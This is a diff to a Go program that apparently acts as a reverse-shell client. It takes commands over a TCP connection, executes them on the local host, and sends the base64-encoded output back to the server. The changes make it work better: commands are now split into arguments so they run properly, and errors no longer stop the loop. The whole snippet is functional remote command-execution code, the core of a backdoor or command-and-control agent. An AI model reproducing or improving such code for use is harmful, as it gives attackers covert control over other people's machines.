@@ -32,24 +32,23 @@ func main() {
 			return
 		}
 		if strings.TrimSpace(string(netData)) == "STOP" {
-			fmt.Println("Exiting TCP server!")
+			fmt.Println("Disconnecting from server!")
 			return
 		}
 
 		fmt.Print("-> ", string(netData))
-		// Run command
+		// Run command and store output
 		command := strings.Replace(netData, "\n", "", -1)
+		command_array := strings.Fields(command)
 		fmt.Println("Running command: " + string(command))
-		out, err := exec.Command(string(command)).Output()
+		out, err := exec.Command(command_array[0], command_array[1:]...).Output()
 		if err != nil {
-			log.Fatal(err)
+			log.SetFlags(0)
+			log.Printf("Error running command: %s", err)
+			// log.Print(err)
 		}
-		// print time to client
-		// t := time.Now()
-		// myTime := t.Format(time.RFC3339) + "\n"
-		// c.Write([]byte(myTime))
 
-		// Base64 encoding command output
+		// Base64 encoding command output and sending to server
 		sEnc := b64.StdEncoding.EncodeToString([]byte(out))
 		c.Write([]byte(sEnc + "\n"))
 	}
